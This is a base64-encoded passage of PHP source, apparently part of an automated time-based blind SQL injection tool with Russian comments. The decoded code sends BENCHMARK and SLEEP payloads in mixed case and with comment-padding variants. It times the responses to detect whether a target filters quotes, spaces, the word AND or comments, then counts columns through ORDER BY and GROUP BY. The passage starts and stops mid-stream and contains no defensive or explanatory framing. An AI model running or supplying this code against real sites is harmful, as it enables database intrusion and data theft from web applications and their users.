NC90LDQu9C40YfQuNC1INGE0LjQu9GM0YLRgNCw0YbQuNC4INC60YvQstGL0YfQutC4CgkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiBBbkQgQkVuY0hNQVJrKDI5OTk5OTksTWQ1KE5vVygnJykpKSIpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQoJCQkJCS8v0YPRgdC/0LXRiNC90L4sINC/0YDQtdC00L/QvtC70LDQs9Cw0LXRgiwg0YfRgtC+INC90LUg0YTQuNC70YzRgtGA0YPQtdGC0YHRjy4KCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpewoJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iIEFORCBCRW5DSE0nQVJLKDI5OTk5OTksTWQ1KE5vVygpKSkiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJLy/QntGF0YPQtdGC0Ywg0Y3RgtC+INCx0YvQu9CwIDQwNCDRgdGC0YDQvtC60LApCgkJCQkJCWlmKCR0aGlzLT50bXAtJHRoaXMtPnNjbmQ+MSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsncXQnXT10cnVlOwoJCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydxdCddPWZhbHNlOwoJCQkJCX1lbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydxdCddPXRydWU7CgkJCQkJCgkJCQkKCgkJCQkJLy/QntC/0YDQtdC00LXQu9GP0LXQvCDQvdCw0LvQuNGH0LjQtSDRhNC40LvRjNGC0YDQsNGG0LjQuCDQtNCy0L7QudC90L7Qs9C+INC60L7QvNC80LXQvdGC0LDRgNC40Y8KCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4nLyoqL0FOZC8qKi9iRU5jaE1BUksoMjk5OTk5OSxtRDUoTk93KCkpKScpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCWlmKCR0aGlzLT50bXAtJHRoaXMtPnNjbmQ+MSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT1mYWxzZTsKCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddPXRydWU7CgkJCQkJaWYoJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ118fCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydxdCddKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWyd0cCddPXRydWU7CgkJCQkJCQoJCQkJLy8tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0vLwoJCQkJfWVsc2UgaWYoJHRoaXMtPnJldFsnc2xlZXAnXVsndHAnXT09NikKCQkJCXsvLyYmQkVOQ0hNQVJLKDI5OTk5OTksTUQ1KE5PVygpKSkKCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3EnXT1mYWxzZTsKCgkJCQkJLy/QntC/0YDQtdC00LXQu9GP0LXQvCDQvdCw0LvQuNGH0LjQtSDRhNC40LvRjNGC0YDQsNGG0LjQuCDQutGL0LLRi9GH0LrQuAoJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLiImJkJlbkNITUFSSygyOTk5OTk5LG1ENShuT1coJycpKSkiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpewoJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJiZiRU5DSE0nQVJLKDI5OTk5OTksTWQ1KE5vdygpKSkiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJaWYoJHRoaXMtPnRtcC0kdGhpcy0+c2NuZD4xKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydxdCddPXRydWU7CgkJCQkJCWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3F0J109ZmFsc2U7CgkJCQkJfWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3F0J109dHJ1ZTsKCQkJCQkvL2VjaG8oJzAwMCcpOwoJCQkJCQoJCQkJCS8v0J7Qv9GA0LXQtNC10LvQtdC90LjQtSDRhNC40LvRjNGC0YDQsNGG0LjQuCDQv9GA0L7QsdC10LvQsCDQv9GA0Lgg0L7RgtGB0YPRgtGB0YLQstC40Lgg0YTQuNC70YzRgtGA0LDRhtC40Lgg0LrQsNCy0YvRh9C60LgKCQkJCQlpZighJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3F0J10pewoJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJiZiRU5DSE1BcmsoMjk5OSA5OTksbUQ1KG5vVygpKSkiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJLy/QtdGB0LvQuCDQstGL0L/QvtC70L3QuNC70YHRjywg0LfQvdCw0YfQuNGCINGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8uCgkJCQkJCWlmKCR0aGlzLT50bXAtJHRoaXMtPnNjbmQ+MSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXT10cnVlOwoJCQkJCQllbHNlewoJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiYmJyAnPTB4MjAmJkJlbkNITUFSSygyOTk5OTk5LE1kNShOT3coKSkpIikpLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109ZmFsc2U7CgkJCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcCddPXRydWU7CgkJCQkJCX0KCQkJCQl9ZWxzZXsKCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiYmQkVOQ0htYVJLKDI5OTkgOTk5LE1kNShOb1coKSkpIikpLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkJCWlmKCR0aGlzLT50bXAtJHRoaXMtPnNjbmQ+MSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXT10cnVlOwoJCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcCddPXRydWU7CgkJCQkJfQoJCQkJCS8v0JXRgdC70Lgg0L3QtSDRhNC40LvRjNGC0YDRg9C10YLRgdGPINC/0YDQvtCx0LXQuyDRgtC+INC30L3QsNGH0LjRgiDRhNC40LvRjNGC0YDRg9C10YLRgdGPINGB0LvQvtCy0L4gQU5ECgkJCQkJaWYoISR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcCddKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddPXRydWU7CgkJCQkJZWxzZXsKCQkJCQkJLy/QntC/0YDQtdC00LXQu9C10L3QuNC1INGE0LjQu9GM0YLRgNCw0YbQuNC4INGB0LvQvtCy0LAgQU5EINC/0YDQuCDQvdCw0LvQuNGH0LjQuCDRhNC40LvRjNGC0YDQsNGG0LjQuCDQv9GA0L7QsdC10LvQsCDQuCDQvtGC0YHRg9GC0YHRgtCy0LjQuCDRhNC40LvRjNGC0YDQsNGG0LjQuCDQutCw0LLRi9GH0LrQuAoJCQkJCQlpZighJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3F0J10pewoJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiYmJ0FORCc9MHg0MTRFNDQmJkJFTkNITUFySygyOTk5OTk5LG1ENShuT1coKSkpIikpLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ109ZmFsc2U7CgkJCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddPXRydWU7CgkJCQkJCX1lbHNlewoJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiYmKDEpQW5EQHg6PTEmJkJFTmNITUFSSygyOTk5OTk5LE1kNShOT3coKSkpIikpLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ109ZmFsc2U7CgkJCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddPXRydWU7CgkJCQkJCX0KCQkJCQl9CgoJCQkJCS8v0J7Qv9GA0LXQtNC10LvRj9C10Lwg0L3QsNC70LjRh9C40LUg0YTQuNC70YzRgtGA0LDRhtC40Lgg0LTQstC+0LnQvdC+0LPQviDQutC+0LzQvNC10L3RgtCw0YDQuNGPINC/0YDQuCDQvtGC0YHRg9GC0YHRgtCy0LjQuCDRhNC40LvRjNGC0YDQsNGG0LjQuCDQutCw0LLRi9GH0LrQuAoJCQkJCWlmKCEkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsncXQnXSl7CgkJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLiImJicvKiovJz0weDJGMkEyQTJGJiZCRW5jSE1BUksoMjk5OSA5OTksTUQ1KG5vVygpKSkiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJaWYoJHRoaXMtPnRtcC0kdGhpcy0+c2NuZD4xKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddPWZhbHNlOwoJCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddPXRydWU7CgkJCQkJfWVsc2V7CgkJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLiIvKiovJiYvKiovQkVOQ2htQVJLKDI5OTkgOTk5LG1ENShOb1coKSkpIikpLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkJCWlmKCR0aGlzLT50bXAtJHRoaXMtPnNjbmQ+MSl7CgkJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJiZCRU5DaG1BUmsoMjk5OS8qKi85OTksTWQ1KE5vVygpKSkiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJCWlmKCR0aGlzLT50bXAtJHRoaXMtPnNjbmQ+MSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT10cnVlOwoJCQkJCQkJZWxzZSAkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT1mYWxzZTsKCQkJCQkJfWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ109dHJ1ZTsKCQkJCQl9CgkJCQkJaWYoJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ118fCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydxdCddfHwkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnYW4nXXx8JHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ10pJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3RwJ109dHJ1ZTsKCQkJCS8vLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLy8KCQkJCX1lbHNlIGlmKCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3RwJ109PTcpCgkJCQl7Ly8nIEFORCBCRU5DSE1BUksoMjk5OTk5OSxNRDUoTk9XKCkpKSBBTkQgJzEKCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3EnXT10cnVlOwoKCQkJCQkvL9Ce0L/RgNC10LTQtdC70Y/QtdC8INC90LDQu9C40YfQuNC1INGE0LjQu9GM0YLRgNCw0YbQuNC4INC00LLQvtC50L3QvtCz0L4g0LrQvtC80LzQtdC90YLQsNGA0LjRjwoJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLiInLyoqL2FORC8qKi9CZU5DSE1BUmsoMjk5OTk5OSxNRDUoTm9XKCkpKS8qKi9BbkQvKiovJzEiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ109ZmFsc2U7CgkJCQkJZWxzZSAkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT10cnVlOwoKCQkJCQlpZigkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsndHAnXT10cnVlOwoJCQkJLy8tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0vLwoJCQkJfWVsc2UgaWYoJHRoaXMtPnJldFsnc2xlZXAnXVsndHAnXT09OCkKCQkJCXsvLycmJkJFTkNITUFSSygyOTk5OTk5LE1ENShOT1coKSkpJiYnMQoJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcSddPXRydWU7CgoJCQkJCS8v0YTQuNC70YzRgtGA0LDRhtC40Y8g0L3QsCDQv9GA0L7QsdC10LssINCx0LXQtyDRhNC40LvRjNGC0YDQsNGG0LjQuCDQvdCwINC60LDQstGL0YfQutC4CgkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIicmJkJlTkNoTUFSSygyOSA5OTk5OSxNZDUobk9XKCkpKSYmJzEiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109dHJ1ZTsKCQkJCQllbHNlewoJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJyYmJyAnPTB4MjAmJkJFTkNIbUFSSygyOTk5OTk5LG1ENShuT1coKSkpJiYnMSIpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109ZmFsc2U7CgkJCQkJCWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109dHJ1ZTsKCQkJCQl9CgoJCQkJCS8v0JXRgdC70Lgg0L3QtSDRhNC40LvRjNGC0YDRg9C10YLRgdGPINC/0YDQvtCx0LXQuyDRgtC+INC30L3QsNGH0LjRgiDRhNC40LvRjNGC0YDRg9C10YLRgdGPINGB0LvQvtCy0L4gQU5ECgkJCQkJaWYoISR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcCddKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddPXRydWU7CgkJCQkJZWxzZXsKCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIidBTkQnMScmJkJFTkNIbUFySygyOTk5OTk5LE1kNShuT1coKSkpJiYnMSIpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ109ZmFsc2U7CgkJCQkJCWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ109dHJ1ZTsKCQkJCQl9CgoJCQkJCS8v0J7Qv9GA0LXQtNC10LvRj9C10Lwg0L3QsNC70LjRh9C40LUg0YTQuNC70YzRgtGA0LDRhtC40Lgg0LTQstC+0LnQvdC+0LPQviDQutC+0LzQvNC10L3RgtCw0YDQuNGPCgkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIicmJicvKiovJz0weDJGMkEyQTJGJiZiRW5DSE1BUksoMjk5OTk5OSxNZDUobk9XKCkpKSYmJzEiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQlpZigkdGhpcy0+dG1wLSR0aGlzLT5zY25kPjEpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ109ZmFsc2U7CgkJCQkJZWxzZSAkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT10cnVlOwoKCQkJCQlpZigkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXXx8JHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ118fCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWyd0cCddPXRydWU7CgkJCQl9CgkJCX0KCQkJCgkJCQoJCQlpZighZW1wdHkoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10pKQoJCQkJewoJCQkJCS8vKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrLy8KCQkJCQkKCQkJCQkvL9C+0L/RgNC10LTQtdC70Y/QtdC8INC30LDQutGA0YvQstCw0Y7RidC40Lkg0YHQuNC80LLQvtC7INC4INC60YDQsNC50L3QuNC5INC60L7QvNC80LXQvdGC0LDRgNC40LkKCQkJCQkkdXNbJ3NjYiddPScnOwoJCQkJCQoJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5jbGVhcl9zcWwoJ0FuRCBTTGVlUCgnLiR0aGlzLT5zZWMuJyknLiR1c1snc2NiJ10uJyAjJykpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQoKCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkKCQkJCQl7CgkJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2NvbWVudCddPScgIyc7CgkJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ3NjYiddPScnOwoJCQkJCX1lbHNlCgkJCQkJewoJCQkJCQkkdXNbJ3NjYiddPScnOwoJCQkJCQlmb3IoJGk9MDskaTwzOyRpKyspCgkJCQkJCXsKCQkJCQkJCWZvcigkaTI9MDskaTI8NDskaTIrKykKCQkJCQkJCXsKCQkJCQkJCQlpZigkaTI9PTApJHVzWydjb21lbnQnXT0nICc7CgkJCQkJCQkJZWxzZWlmKCRpMj09MSkkdXNbJ2NvbWVudCddPScgLS0gJzsKCQkJCQkJCQllbHNlaWYoJGkyPT0yKSR1c1snY29tZW50J109JyAjJzsKCQkJCQkJCQllbHNlaWYoJGkyPT0zKSR1c1snY29tZW50J109JyAvKic7CgoJCQkJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5jbGVhcl9zcWwoJ0FuZCBzTEVFcCgnLiR0aGlzLT5zZWMuJyknLiR1c1snc2NiJ10uJHVzWydjb21lbnQnXSkpKSwnaGVhZGVyJywndGltZScpOwoKCQkJCQkKCQkJCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkKCQkJCQkJCQl7CgkJCQkJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2NvbWVudCddPSAkdXNbJ2NvbWVudCddOwoJCQkJCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydzY2InXSAgID0gJHVzWydzY2InXTsKCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQkJJHVzWydzY2InXS49JyknOwoJCQkJCQl9CgkJCQkJfQoJCQkJCQoJCQkJCSR0aGlzLT5jb21tZW50ID0gJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J107CgkJCQkJJHRoaXMtPnNjYiAgPSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ3NjYiddOwoJCQkJCS8vKysrKysrKysrKysrKysrKysrKysrKysrKysrKwoJCQkJCQoJCQkJCQoJCQkJCWlmKCghJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ10pfHwoISR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddKSkKCQkJCQkJewoJCQkJCQkJJG9nID0gJ29SRGVSJzsKCQkJCQkJCS8v0JrQvtC70LjRh9C10YHRgtCy0L4g0LrQvtC70L7QvdC+0Log0LIg0YLQsNCx0LvQuNGG0LUg0YfQtdGA0LXQtyBvcmRlcgoJCQkJCQkJJHRoaXMtPnRtcCA9ICR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+Y2xlYXJfc3FsKCdBTkQgU0xFRVAoJy4kdGhpcy0+c2VjLicpJy4kdGhpcy0+c2V0WydzbGVlcCddWydzY2InXS4nICcuJG9nLicgQlkgMScuJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J10pKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJCQoJCQkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpCgkJCQkJCQl7CgkJCQkJCQkJLy8kdGhpcy0+bG9nZygnPGI+0J/QvtC00LHQuNGA0LDQtdC8INC60L7Qu9C40YfQtdGB0YLQstC+INGB0YLQvtC70LHRhtC+0LI6PC9iPicpOwoKCQkJCQkJCX1lbHNlCgkJCQkJCQl7CgkJCQkJCQkJLy8kdGhpcy0+bG9nZygnPGI+0J/RgNC+0LHRg9C10Lwg0YfQtdGA0LXQtyBncm91cCBieTwvYj4nLDIpOwoJCQkJCQkJCQoJCQkJCQkJCSRvZyA9ICdHck91cCc7CgkJCQkJCQkJLy/QmtC+0LvQuNGH0LXRgdGC0LLQviDQutC+0LvQvtC90L7QuiDQsiDRgtCw0LHQu9C40YbQtSDRh9C10YDQtdC3IGdyb3VwIGJ5CgkJCQkJCQkJJHRoaXMtPnRtcCA9ICR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+Y2xlYXJfc3FsKCdBTkQgU0xFRVAoJy4kdGhpcy0+c2VjLicpJy4kdGhpcy0+c2V0WydzbGVlcCddWydzY2InXS4nICcuJG9nLicgQlkgMScuJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J10pKSksJ2hlYWRlcicsJ3RpbWUnKTsKCgkJCQkJCQkJaWYoJHRoaXMtPnRtcDwoJHRoaXMtPnNlYy0xKSkKCQkJCQkJCQl7CgkJCQkJCQkJCS8vJHRoaXMtPmxvZ2coJzxiPtCa0L7RgdGP0Log0LIg0LfQsNC/0YDQvtGB0LDRhSBHUk9VUCDQmCBPUkRFUjwvYj4nLDIpOwoJCQkJCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydjb2x1bW5zJ10gPSAwOwoJCQkJCQkJCQkKCQkJCQkJCQkJCQoJCQkJCQkJCX0JCgkJCQkJCQl9CgkJCQkJCQkKCQkJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ29nJ10gPSAkb2c7CgkJCQkJCQkkbWluPTE7CgkJCQkJCQkkbWF4PTIwOwoJCQkJCQkJCQkJCgkJCQkJCQkvL9C80LjQvdC40LzQsNC70YzQvdGL0Lwg0LrQvtC70LjRh9C10YHRgtCy0L7QvCDQt9Cw0L/RgNC+0YHQvtC8INC40YnQtdC8INC60L7Qu9C40YfQtdGB0YLQstC+INC60L7Qu9C+0L3QvtC6CgkJCQkJCQlmb3IoJGk9MDskaTw1OyRpKyspCgkJCQkJCQl7CgkJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPmNsZWFyX3NxbCgnQU5EIFNMRUVQKCcuJHRoaXMtPnNlYy4nKScuJHRoaXMtPn